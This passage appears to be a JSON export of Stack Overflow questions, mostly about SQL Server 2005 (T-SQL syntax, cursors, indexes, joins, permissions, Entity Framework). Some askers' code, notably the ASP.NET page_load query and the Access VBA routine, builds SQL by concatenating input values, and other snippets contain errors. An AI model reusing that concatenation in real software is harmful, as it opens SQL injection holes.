01834\n</code></pre>\n\n<p>Is that at all possible?</p>\n\n<p>This is what I ultimately I'm shooting for... except right now those tables aren't the same size because I need my ErrorTemporaryTable to have a column in which the first row has a number which increments by the previous one by one.</p>\n\n<pre><code>declare @counter int\ndeclare @ClientMessage varchar(255)\ndeclare @TestingMessage carchar(255)\nselect @counter = (select count(*) + 1 as counter from ErrorValidationTesting)\nwhile @counter &lt;= (select count(*) from ErrorValidationTable ET, ErrorValidationMessage EM where ET.Error = EM.Error_ID)\nbegin\n    insert into ErrorValidationTesting (Validation_Error_ID, Program_ID, Displayed_ID, Client_Message, Testing_Message, Create_Date)\n    select * from ErrorTemporaryTable\n\n    select @counter = @counter + 1\n\nend\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","append"],"answer_count":4,"favorite_count":1,"up_vote_count":11,"down_vote_count":0,"view_count":11627,"score":11,"question_id":466323,"title":"How to append to a text field in t-sql SQL Server 2005","body":"<p>What is the best way to append to a text field using t-sql in Sql Server 2005?</p>\n\n<p>With a varchar I would do this.</p>\n\n<pre><code>update tablename set fieldname = fieldname + 'appended string'\n</code></pre>\n\n<p>But this doesn't work with a text field.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2000"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5968,"score":4,"question_id":272254,"title":"Alternative to BACKUP LOG WITH TRUNCATE_ONLY","body":"<p>This piece of T-SQL is deprecated in 2005:</p>\n\n<pre><code>BACKUP LOG [DB_NAME] WITH TRUNCATE_ONLY\n</code></pre>\n\n<p>I don't need to keep a backup the log for my db - but I do not want the piece of code to stop working if we port to SQL2008 or successive versions in future.</p>\n\n<p>Cheers</p>\n"},{"tags":["c#","sql-server-2005","asp.net-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13052092,"title":"Timeout connection error while executing this piece of code in ASP.NET 2.0 and C#","body":"<p>I am using the below code to grab the page tiles, meta description from database created in SQL Server 2005. My site is built with ASP.NET 2.0 and C#.</p>\n\n<p>On <code>page_load</code> I am executing this code:</p>\n\n<pre><code>string query = \"select MetaDescription, MetaKeywords, H1Text, Ptitle, H2Text FROM SeoText Where CatalogItemId ='\" + this.CurrentEnsemble.ItemId + \"'\";\n\nSqlConnection myconnection = new SqlConnection(ConfigurationManager.ConnectionStrings[\"DBconnection\"].ConnectionString);\n\nSqlCommand SqlCmd = null;\nSqlCmd = new SqlCommand(query, myconnection);\n\nSqlDataAdapter ad = new SqlDataAdapter(SqlCmd);\n\nDataTable dt = new DataTable();\nad.Fill(dt);\n\nif (dt.Rows[0][\"Ptitle\"].ToString() == \"\")\n{\n   this.Page.Title = this.CurrentEnsemble.Title;\n}\nelse\n{\n   this.Page.Title = this.CurrentEnsemble.Title + \" \" + dt.Rows[0][\"Ptitle\"].ToString();\n}\n\nHtmlMeta metaDesc = (HtmlMeta)Page.Header.FindControl(\"metaDesc\");\n\nif (dt.Rows[0][\"MetaDescription\"].ToString() == \"\")\n{\n   metaDesc.Attributes.Add(\"Content\", this.CurrentEnsemble.Title );\n}\nelse\n{\n   metaDesc.Attributes.Add(\"Content\", dt.Rows[0][\"MetaDescription\"].ToString());\n}\n\nHtmlMeta metaKey = (HtmlMeta)Page.Header.FindControl(\"metaKey\");\n\nif (dt.Rows[0][\"MetaKeywords\"].ToString() == \"\")\n{\n   metaKey.Attributes.Add(\"Content\", \"site general text\");\n}\nelse\n{\n   metaKey.Attributes.Add(\"Content\", dt.Rows[0][\"MetaKeywords\"].ToString());\n}\n\nHtmlGenericControl h1 = (HtmlGenericControl)Master.Master.Master.FindControl(\"h1top\");\n\nif (dt.Rows[0][\"H1Text\"].ToString() == \"\")\n{\n    h1.InnerText = \"site general text\";\n}\nelse\n{\n    h1.InnerText = this.CurrentEnsemble.Title + \" \" + dt.Rows[0][\"H1Text\"].ToString();\n}\n\nHtmlGenericControl h2 = (HtmlGenericControl)Master.Master.Master.FindControl(\"h2bottom\");\n\nif (dt.Rows[0][\"H2Text\"].ToString() == \"\")\n{\n    h2.InnerText = \"site general text\";\n}\nelse\n{\n    h2.InnerText = this.CurrentEnsemble.Title + \" \" + dt.Rows[0][\"H2Text\"].ToString();\n}\n</code></pre>\n\n<p>The error is thrown at </p>\n\n<pre><code>ad.Fill(dt)\n</code></pre>\n\n<p>I am not sure where I am making the mistake.</p>\n\n<p>Thanks and appreciate it</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":13049031,"title":"Wanted to add two more column , in existing select statement","body":"<p>I have a sample query </p>\n\n<pre><code>select \n    x as 1, y as 2 , z as 3 \nfrom \n    table abc, xyz\nwhere \n    a = x and x = 123\n</code></pre>\n\n<p>Now I want to add two more columns in this <code>SELECT</code> statement like this:</p>\n\n<ol>\n<li>column 4 which will show the row sequence no.</li>\n<li>column 5: this column will depend on the row - it will show <code>start</code> in first row, <code>Last</code> in the last row and <code>Middle</code> in any rows in between.</li>\n</ol>\n\n<p>Please suggest the best possible optimize way to do this.</p>\n\n<p>Thanks </p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":8,"favorite_count":7,"up_vote_count":46,"down_vote_count":0,"view_count":42633,"score":46,"question_id":266924,"title":"Create a date with T-SQL","body":"<p>I am trying to convert a date with individual parts such as 12, 1, 2007 into a datetime in SQL Server 2005. I have tried the following:</p>\n\n<pre><code>CAST(DATEPART(year, DATE)+'-'+ DATEPART(month, DATE) +'-'+ DATEPART(day, DATE) AS DATETIME)\n</code></pre>\n\n<p>but this results in the wrong date. What is the correct way to turn the three date values into a proper datetime format.</p>\n"},{"tags":["sql-server-2005","cursor"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13051616,"title":"Should I be avoiding @@Fetch_Status?","body":"<p>After doing some reading it became apparent that multiple procedures can modify the global variable <code>@@Fetch_Status</code>.  We have a stored procedure that calls other stored procedures every hour (kind of like a table driven trigger, this way clients get control but no on has to touch but one trigger). So this parent procedure with calls these children procedures uses a cursor. Some of the child procedures could use cursors too. </p>\n\n<p>I know every <code>Fetch Next</code> call is pretty much immediately followed by a <code>@@Fetch_Status</code> call but with things happening in parallel I wasn't sure if calling <code>@@Fetch_Status</code> was thread safe, especially considering the <strong>Remarks</strong> section <a href=\"http://msdn.microsoft.com/en-us/library/ms187308%28v=sql.90%29.aspx\" rel=\"nofollow\">here</a>. So I thought it would be a bright idea to replace all my <code>While @@Fetch_Status = 0)</code> calls to be something like </p>\n\n<pre><code>WHILE ( (SELECT fetch_status\nFROM sys.dm_exec_cursors(0)\nwhere name = 'server_cursor')=0) BEGIN\n</code></pre>\n\n<p>This worked great on my computer but when I moved it over to a client machine I learned that I don't have select permissions on the <code>sys.dm_exec_cursors(0)</code> table. I get the error <code>The user does not have permission to perform this action.</code>. </p>\n\n<p>Or alternatively, if I try <code>select * from sys.syscursors</code> I get the error <code>The SELECT permission was denied on the object 'syscursors', database 'mssqlsystemresource', schema 'sys'.</code></p>\n\n<p>Is there another way to do this that ensures multiple simultaneous cursors do not step on each other? Or am I working too hard here?</p>\n"},{"tags":["performance","sql-server-2005","computed-columns"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":13051507,"title":"Computed column index","body":"<p>I have a table <code>Com_Main</code> which contains column <code>CompanyName nvarchar(250)</code>. It has average length of 19, max length = 250.</p>\n\n<p>To improve performance I want to add a computed column <code>left20_CompanyName</code> which holds the first 20 characters of <code>CompanyName</code>:</p>\n\n<pre><code>alter table Com_main \nadd left20_CompanyName as LEFT(CompanyName, 20) PERSISTED\n</code></pre>\n\n<p>Then I create Index on this column:</p>\n\n<pre><code>create index ix_com_main_left20CompanyName \non Com_main (LEFT20_CompanyName)\n</code></pre>\n\n<p>So when I use</p>\n\n<pre><code>select CompanyName from Com_Main\nwhere LEFT20_CompanyName LIKE '122%'\n</code></pre>\n\n<p>it uses this nonclustered index, but when the query is like:</p>\n\n<pre><code>select CompanyName from Com_Main \nwhere CompanyName LIKE '122%'\n</code></pre>\n\n<p>It uses full table scan, and don't use this index. </p>\n\n<p>So the question:</p>\n\n<p>Is it possible to make SQL Server use this index on computable column in last query?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","set-based"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":84,"score":6,"question_id":13030723,"title":"Trying to avoid RBAR! How to correlate an insert on a related table as a set based operation?","body":"<p>Assume a schema that consists of the following tables:</p>\n\n<p><strong>Baz</strong></p>\n\n<pre><code>BazID (PK, Identity)\nDescription\n</code></pre>\n\n<p><strong>FooTemplate</strong> (A Baz may have zero to many FooTemplates)</p>\n\n<pre><code>FooTemplateID (PK, Identity)\nBazID (FK)\nDescription\nNextGenerationDate\n</code></pre>\n\n<p><strong>BarTemplate</strong> (A FooTemplate may have zero to many BarTemplates)</p>\n\n<pre><code>BarTemplateID (PK, Identity)\nFooTemplateID (FK)\nDescription\n</code></pre>\n\n<p><strong>Foo</strong> (A Baz may have zero to many Foos)</p>\n\n<pre><code>FooID (PK, Identity) \nBazID (FK)\nDescription\n</code></pre>\n\n<p><strong>Bar</strong> (A Foo may have zero to many Bars)</p>\n\n<pre><code>BarID (PK, Identity)\nFooID (FK)\nDescription\n</code></pre>\n\n<p>Each day a stored procedure will execute to generate <code>Foo</code> and <code>Bar</code> entities for an associated <code>Baz</code> entity which have passed their next generation date.</p>\n\n<p>The first part of this procedure looks a little like this:</p>\n\n<pre><code>DECLARE @GeneratedFooIDList TABLE (INT FooID);\nINSERT Foo (BazID, Description)\nOUTPUT inserted.FooID INTO @GeneratedFooIDList\nSELECT\n  BazID\n  Description\nFROM\n  FooTemplate\nWHERE\n  NextGenerationDate &lt; GETDATE()\n</code></pre>\n\n<p>My question is what statement can I now execute to generate the proper <code>Bar</code> entities and have them properly associated with the newly created <code>Foo</code> entities?</p>\n\n<p><strong>EDIT:</strong> The procedure will be executing on a server running SQL Server 2005.</p>\n\n<p><strong>EDIT2:</strong> Thanks to everybody for the help.  After considering the information carefully, I have opted for another solution.  I have changed the primary key in the Foo table to no longer be an automatically generated identity column, this way an intermediary insert into a temporary table could be executed to capture the relevant FooTemplateID along with the FooID</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":10,"favorite_count":2,"up_vote_count":11,"down_vote_count":0,"view_count":9295,"score":11,"question_id":916414,"title":"How can a LEFT OUTER JOIN return more records than exist in the left table?","body":"<p>I have a very basic LEFT OUTER JOIN to return all results from the left table and some additional information from a much bigger table. The left table contains 4935 records yet when I LEFT OUTER JOIN it to an additional table the record count is significatnly larger.</p>\n\n<p>As far as I'm aware it is absolute gospel that a LEFT OUTER JOIN will return all records from the left table with matched records from the right table and null values for any rows which cannot be matched, as such it's my understanding that it should be impossible to return more rows than exist in the left table, but it's happening all the same!</p>\n\n<p>SQL Query follows:</p>\n\n<pre><code>SELECT     SUSP.Susp_Visits.SuspReason, SUSP.Susp_Visits.SiteID\nFROM         SUSP.Susp_Visits LEFT OUTER JOIN\n                      DATA.Dim_Member ON SUSP.Susp_Visits.MemID = DATA.Dim_Member.MembershipNum\n</code></pre>\n\n<p>Perhaps I have made a mistake in the syntax or my understanding of LEFT OUTER JOIN is incomplete, whatever the reason I'm going mad here, hopefully someone can explain how this could be occuring?</p>\n\n<p>Postscript</p>\n\n<p>Thanks for the grea answers, my understanding of LEFT OUTER JOINS is now much better, could anyone however suggest a way this query could be modified so that I only get as many records returned as exist in the left table? </p>\n\n<p>This query is purely to generate a report and the duplicate matches simply confuse matters.</p>\n\n<p>/Postscript</p>\n"},{"tags":["c#","sql","sql-server-2005","dataset"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":13041795,"title":"Splitting a dataset in to datatables","body":"<p>I have a software system that I am 'trying' to maintain and upgrade.  I have had no formal c# training and only 1 class of sql.  Most of my limited experience is with Java, C++.  We are using MSSQL 2005.</p>\n\n<p>I have a query run in c# that gets a dataset with 1 table and 15 or so columns.  The number of rows returned is different each time it is ran.  The first column is the storeid.  I need to separate records by storeid in to their own datatable.  Once I have that there is an existing method for sending it out to a CSV file.</p>\n\n<p>So far I have found Datatable.Select, order it by storeid.</p>\n\n<p>One option would be pulling all the unique storeid's from the dataset and putting them into an array.  Then I could query based on existing storeid's and copy or move those rows to a new datatable using a foreach.</p>\n\n<p>If someone could just point me in the right direction it would be much appreciated.</p>\n\n<p>Mark</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":13039742,"title":"Create a user with permissions for only 1 database","body":"<p>What is the way via a script to add a user to a database with permissions of select, insert, update and delete but only have access to that one database?</p>\n"},{"tags":["sql-server-2005","sql-server-2008","database-backups","downgrade"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":15964,"score":4,"question_id":849678,"title":"Downgrading SQL server 2008 to SQL Server 2005","body":"<p>Are there any issues backing up a database from SQL Server 2008, and then importing it into SQL Server 2005? I had upgraded to SQL Server 2008, but 2008 seems to be too problematic so now I want to downgrade. Are there any problems in doing this?</p>\n"},{"tags":["entity-framework","sql-server-2005","entity-framework-5"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":13039207,"title":"Entity Framework and date+time arithmetic","body":"<p>We have the situation where we have a SQL Server 2005 table with a Date column and a separate Time column.  When I try to query this table, I'd like to do the equivalent of the following SQL:</p>\n\n<p><code>where Date + Time &gt; @Something</code></p>\n\n<p><em>Some background info - the Date is stored as a date with a 00:00 time component, and the Time is stored as a Time with a 1900-01-01 date component - this means in SQL adding the two together get you a full DateTime.</em></p>\n\n<p>I know there are indexing implications above, but that is not what the question is about.</p>\n\n<p><strong>How do you do this in linq to entities?</strong></p>\n\n<p>Some other things to note:</p>\n\n<ul>\n<li>Changing the database schema is out of the question.</li>\n<li>This is SQL 2005 so no Time datatype, and no TimeSpan returned from EF (I have tried changing the EF model to try and cast it to a TimeSpan, but no dice)</li>\n<li>I want to try and stick to pure Linq-to-Entities and not go down the E-SQL / stored procedure / ExecuteQuery route.</li>\n</ul>\n"},{"tags":["sql-server","sql-server-2005","tsql","schema"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":4207,"score":5,"question_id":3806245,"title":"SQL server schema and default schema","body":"<p>I have a schema define in my database. Except now everytime I do a sql statement I have to provide the schema ... \n<code>SELECT * FROM [myschema].table</code></p>\n\n<p>I set the default schema for my user using management studio and also ran the \n<code>ALTER USER myUser WITH DEFAULT_SCHEMA [myschema]</code> \nand I still get the invalid object 'table' when writing a query without the schema (SELECT * FROM table)</p>\n\n<p>Is there a way to write <code>SELECT * FROM table</code> without having to specify the schema name all the time?</p>\n\n<p>It's on SQL 2005 using SQL Management Studio.</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","sql-server-2008-r2","sql-server-2000"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":13038964,"title":"SQL Server - Select between two number ranges in a varchar field with text and numbers","body":"<p>I have a table with ranges of numbers from 0-2000000. I can use a between statement to get the records of things if I do a BETWEEN 50 AND 100. That works. </p>\n\n<p>But the problem I'm running into is since this column is a varchar if there are any records with a something in the string as \"1FD32\", I can't select between it. SQL server can't convert the \"BETWEEN 50 AND 100\" because it is looking for an int. How can i get all the records between these ranges, and ignore any with letters in them?</p>\n"},{"tags":["c#","asp.net-mvc","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":181,"score":-1,"question_id":9547538,"title":"Assembly for DBDataContext, I am so new","body":"<p>I peek into my classmate's computer program and I see this:</p>\n\n<pre><code>DBDataContext db = new DBDataContext();\n</code></pre>\n\n<p>I try the same but my program reports that There is no <code>DBDataContext</code>, what assembly is it I need to reference now?</p>\n"},{"tags":["sql","sql-server-2005","join","trim"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":51,"score":1,"question_id":13034510,"title":"Remove specific characters from column data of select query","body":"<p>I have searched and searched for a solution to my problem and even though I've found some that may help, I'm not sure it's the right way to do it for what I need. Keep in mind I am learning and fairly new to SQL. But I have two tables I want to query using an inner join.</p>\n\n<p>There is a column named <code>CAVITY</code> in both tables but they hold the values in different formats. One table holds the value as H02 and the other table hold the value as just 2. </p>\n\n<p>I want to inner join on this column using the H02 format but don't want to UPDATE the table that holds the value as a single number(for data entry purposes). So for example, if the one table column has H02 and the other has 2, I want it to be joined. If one table has H13 and the other 13, I want it to be a join as well. So basically, I am wanting to remove the H and 0 (but only if there is a 0 that directly follows the H). Unless there is a way to do the opposite and add the H / H0 from the results of the other table.</p>\n\n<pre><code>example data\ntable1.cavity   table2.cavity\n     H01      =    1\n     H02      =    2\n     H10      =    10\n     H12      =    12\n</code></pre>\n\n<p>It doesn't matter to me if my query results are the H0 version or not; I just need the joins to work; I can accommodate for either result in the end.</p>\n\n<p>I am using SQL Server 2005</p>\n\n<p>I have the rest of the query and it works ok; I just need this extra join added. Please help! Any help is GREATLY APPRECIATED. Thank you</p>\n"},{"tags":["sql-server-2005","nhibernate","connection-pooling","nhibernate-3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13033099,"title":"Connection pooling using custom connection provider","body":"<p>Is connection pooling enabled when you use a custom connection provider that generates connection strings dynamically? The user is the only data changed in the connection string, and many sessions can be opened for the same user through the time. By the way, I'm using NHibernate 3.0 to connect to a database in SQL Server 2005.</p>\n"},{"tags":["asp.net","sql-server-2005","replication"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2773,"score":4,"question_id":925824,"title":"when insert length of lob data to be replicated exceeds configured maximum 65536","body":"<p>I am trying to insert a value into a column of datatype image in SQL Server. I am getting the following error:</p>\n\n<pre><code>Length of LOB data (70823) to be replicated exceeds configured maximum 65536.  \nThe statement has been terminated.\n</code></pre>\n\n<p>The data length is less than 2 MB.</p>\n\n<p>What is the problem?</p>\n"},{"tags":["linq","query","sql-server-2005","entity-framework-4"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":396,"score":2,"question_id":10431578,"title":"Linq query giving Invalid column name \"xyz\" error","body":"<p>I am using this LINQ query</p>\n\n<pre><code>var db = new XYZ();\nvar product = (from cp in db.CatalogProducts\n               where cp.ProductID == productId\n               select cp).FirstOrDefault();\n</code></pre>\n\n<p>Running this query gives me an error </p>\n\n<blockquote>\n  <p>Invalid column name 'Cracker Cruncher'.<br>\n  Invalid column name 'crushing torque'.<br>\n  Invalid column name 'Slicing velocity'.</p>\n</blockquote>\n\n<p>Can any one help me in this matter?</p>\n\n<p>Gautam</p>\n"},{"tags":["sql-server-2005","c#-4.0","return-value","asp.net-4.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13002375,"title":"execute a stored procedure that returns a \" completed succesfully \" clue","body":"<p>i have a stored procedure </p>\n\n<pre><code>UPDATE tblTime\nSET TimeOut = DATEADD(HOUR,8,TimeIn)\nWHERE tId =\n( \n   SELECT MAX(tId)\n   FROM tblTime\n   WHERE UserId = 3571\n)\n</code></pre>\n\n<p>although there's no question really, in that case if it did succeed in this query</p>\n\n<p>cause even if the field is empty or if it has value,\nit will in this case succeed</p>\n\n<p>but i do need it for future other queries... and also ,\n in this case i want the C# code to report \nnot only that it was requesting query to be execute - meaning it did happen,</p>\n\n<p>but to get an <strong>actual answer</strong> from sql server\n as a return value that c# could use or turn into <code>Boolean</code></p>\n"},{"tags":["sql-server-2005","visual-studio-2012",".net-4.5"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13028804,"title":"MsSQL connection failed - Visual Studio 2012","body":"<p>After installing Visual Studio 2012 I no longer can connect to MSSql databases.\n(I had Visual Studio 2010 installed before, now I have both installed)</p>\n\n<p>I can't make connections from the Server Explorer and I also can't connect programmatically.\nI get the following error:</p>\n\n<p><strong>\"A connection was successfully established with the server, but then an error occurred during the pre-login handshake. (provider: TCP Provider, error: 0 - The handle is invalid.)\"</strong></p>\n\n<p>I uninstalled the .NET framework 4.5. After that I was able to connect to the database, but unfortunately I got other errors. When I repaired my Visual Studio 2012 installation (it automatically installed .NET framework 4.5) I got the same error again.</p>\n"},{"tags":["sql-server-2005","ssis","imap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1470,"score":0,"question_id":416490,"title":"Fetch mail attachment into SQL Server 2005 using IMAP","body":"<p>I need to import data into my SQL Server 2005 from an e-mail datasource on an Exchange mail server. It means that when a mail is sent to a particular mail address I must retrieve the mail subject and the attached file and then I must import these data into my SQL Server 2005, using IMAP.</p>\n\n<p>Can I do this with SSIS, or do I have to write a Windows Service in C# ?</p>\n\n<p>Do I need to use an IMAP API library of some kind ?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13025480,"title":"I want to create an mdf file of 2GB in SQL Server 2005.","body":"<p>I want to create a new <code>.mdf</code> file of 2GB in SQL Server 2005. </p>\n\n<p>What can I do to create 2GB file?</p>\n"},{"tags":["sql","sql-server-2005","netezza"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":56,"score":-1,"question_id":12953646,"title":"Find Dates - SQL","body":"<p>I have the following from and to dates and need to list using a dynamic sql query only the 3 dates that are mentioned below in netezza database</p>\n\n<pre><code>   From      To\n20120603    20120831\n\n\nRequired Result:     \n20120702\n20120703\n20120801\n</code></pre>\n\n<p>Is there a possibility using dynamic SQL query for netezza that dates in a user specified range can be generated.</p>\n"},{"tags":["forms","sql-server-2005","ms-access","vba","ms-access-2007"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3112,"score":0,"question_id":9394229,"title":"running select query in ms access 2007 vba and assign the resulting value to a textbox","body":"<p>I need to run a sql query and the resulting value is assigned to a textbox in the form.\nI am using docmd.runsql sql to run this query.</p>\n\n<pre><code>Private Sub Form_Current()\nDim SQL As String\nDim db As Database\nDim rs As DAO.Recordset\n\nIf IsNull(Me.txtInstalledQuantity) Then\nSQL = \"select count(tblequipmentbase.id)AS CountInstalledQuantity FROM (tblequipmentbase INNER JOIN     tblequipmentparts ON tblequipmentbase.id=tblequipmentparts.idconnect) INNER JOIN tblparts ON tblequipmentparts.idpart=tblparts.id where tblparts.id= \" &amp; txtQueryID.Value &amp; \";\"\nSet db = CurrentDb\nSet rs = db.OpenRecordset(SQL)\nDoCmd.RunSQL SQL\nMe.txtInstalledQuantity = rs!CountInstalledQuantity\nSet rs = Nothing\nSet db = Nothing\nEnd If\nEnd Sub\n</code></pre>\n\n<p>The error is in the runsql command.</p>\n"},{"tags":["sql-server-2005","ubuntu","ssh","http-tunneling"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13023450,"title":"How can I route tcp requests from local clients through an ssh tunnel on ubuntu?","body":"<p>I would like redirect tcp requests from local clients send to a ubuntu server through an ssh tunnel. Is that possible?</p>\n\n<p>Some details:\nI have a ubuntu server (192.168.10.3) that waits for SSH connects from the internet. These connections are not established directly since the client computers are behind a proxy, so I use the http-tunnel package.</p>\n\n<p>Once the connection is established clients from the ubuntu server's lan (192.168.10.*) should be able to reach a certain server over the ssh tunnel. Specifically I want to connect e.g. from 192.168.10.4 to an sql server instance over the tunnel.</p>\n\n<p>As far as I understand it, the ssh tunnel has to be bidirectional. I think I know how to configure it that way.</p>\n\n<p>But how do I tell the ubuntu server to redirect tcp conections from the lan through the tunnel?</p>\n\n<p>(Hope I didn't explain it to complicated.)</p>\n\n<p>Thanks,\nSascha</p>\n"},{"tags":["sql","sql-server","sql-server-2005","group"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":13020575,"title":"Combining multiple column values into a single column row result","body":"<p>I have a query that pulls in group sale orders for a venue.  My current query pulls all of the info I need, but gives me multiple rows for each order number:</p>\n\n<pre><code>ordCode cltClientName          adrCityDesc  adrStateDesc    adrZipCode  gsnValue2   evShow  shDescr\n739802  Stevens Elementary,    Aberdeen         WA             98520       64        183    Group - Museum Admission\n739802  Stevens Elementary,    Aberdeen         WA             98520       64        237    Extreme Planets\n</code></pre>\n\n<p>What I would like to see is a single row for each order, but with the last column having results separated by comma:</p>\n\n<pre><code>ordCode cltClientName          adrCityDesc  adrStateDesc    adrZipCode  gsnValue2   evShow  shDescr\n739802  Stevens Elementary,    Aberdeen         WA             98520       64        183    Group - Museum Admission, Extreme Planets\n</code></pre>\n\n<p>The Query:</p>\n\n<pre><code>SELECT DISTINCT(ordCode),\n        cltClientName, \n        adrCityDesc,\n        adrStateDesc,\n        adrZipCode,\n        gsnValue2,\n        evShow,\n        shDescr\n\n--COUNT(tiCode)\n  from Orders \n        inner join OrderContacts on orcOrderNumber = ordCode\n        inner join Clients on orcClientID = cltCode\n        inner join ClientAddresses on cltCode = claClientCode\n        inner join Addresses on claAddressCode = adrCode\n        inner join Tickets on tiOrder = ordCode\n        inner join dbo.Events on tiEvent = evCode\n        inner join GroupSaleNotes on ordCode = gsnOrderNumber\n        inner join Shows on evShow = shCode\n WHERE ordOrderTypeTitle = 7 -- Group Sales only\n  and ordOpenDate between '2011-06-01 00:00:00.000' and '2012-05-31 23:59:59.999'\n  and gsnNoteType = '5'\n  and cltIsGroupLeader = '1'\n   --and evShow in (106, 107)\n GROUP BY ordCode, cltClientName, cltCode, adrCityDesc, adrStateDesc,\n      adrZipCode, gsnValue2, evShow, shDescr\nORDER BY adrCityDesc, cltClientName\n</code></pre>\n\n<p>Is there a way to combine this part of the result set?</p>\n"},{"tags":["sql","tsql","sql-server-2005","stored-procedures","clrstoredprocedure"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13008464,"title":"How to extract date fields from string/text field in sql server 2005","body":"<p>There is a text filed in a table called as description. I would like to extract two date fields from this string when there is an occurrence of '~' character using sql server 2005 stored procedure. Help me out in this case.</p>\n\n<p>Example: string: '长期租金;10/1/2012 ~ 10/31/2012'. At occurrence of ~ operator I would like to have from-date: 20121001 and to-date:20121031.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":6,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":853,"score":4,"question_id":337601,"title":"Stored Procedures to .sql files","body":"<p>Is there a simple process in SQL 2005 for spitting all of my stored procedures out to individual .sql files.  I'd like to move them into VSS, but am not too excited by the prospect of clicking on each one to get the source, dumping it into a text file and so on.. </p>\n"},{"tags":["asp.net","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13019248,"title":"Asp.net SQL Server user impersonation","body":"<p>I wonder if somebody could point me in the right direction. We're currently looking to update an ASP.NET application that uses SQL Server 2005 for its db. We need to provide robust and consistent functionality that prevents certain users creating, updating, deleting certain records from the database.</p>\n\n<p>Unfortunately, the application isn't written using OO concepts, instead favouring many data access stored procedures called directly from the web page code behind files. Due to the sheer amount of stored procedures we'd prefer to investigate database triggers to implement our security. </p>\n\n<p>The question is; is it possible for the db trigger to be aware of the specific application user (managed using custom user account tables in the db) which executed the sp? All we'd need is an id. The connection string used to connect to the db is identical for all users (taken from the web.config), is there a way for the connection to some how either impersonate a user, or set a specific variable accessible to the trigger?</p>\n"},{"tags":["sql-server-2005","management-studio"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13006301,"title":"SQL Server Management Studio terminates silently","body":"<p>I am facing issue that SQL Server Management Studio terminates silently apparently when text in message panel is too big e.g. a few million rows. </p>\n\n<p>Is there a solution for this? </p>\n\n<p>And also can we clear this message panel while stored procedure is executing? I am using print statement to see the status of execution. FYI I have data of 3+ million rows to process.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","reporting-services"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":9312,"score":4,"question_id":1097690,"title":"Converting SQL2008 RDL file to SQL2005","body":"<p>How do I convert a RDL file that was created using the SQL2008 designer to work on SQL2005 Reporting services?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13015871,"title":"Slow performance with SQL Query","body":"<p>I'm having some issues with this query running in a timely manner with my 'LineItemsMap' table grows to about a million lines.  Any suggestions on indexes I could create or just better logic with the query would be greatly appreciated.  </p>\n\n<pre><code>    select \n      Id, \n      [Description],\n      SUM(CASE WHEN t1.compliant = 1  THEN 1 ELSE 0 END) as Compliant,\n      SUM(CASE WHEN t1.compliant = 0  THEN 1 ELSE 0 END) as NonCompliant,\n      LastChecked \nfrom lineitems as t0\n      left outer join lineitemsmap as t1 on t0.id = t1.lineitemid\n      left outer join art_blob as t2 on t2.art_blob_id = t1.blobid\n      left outer join art_asset as t3 on t3.art_asset_id = t2.art_asset_id\n      left outer join lineitemexceptions as t4 on t4.assetid = t3.art_asset_id and t4.lineitemid = t1.lineitemid\nwhere t0.active = 1 and t4.assetid is null\ngroup 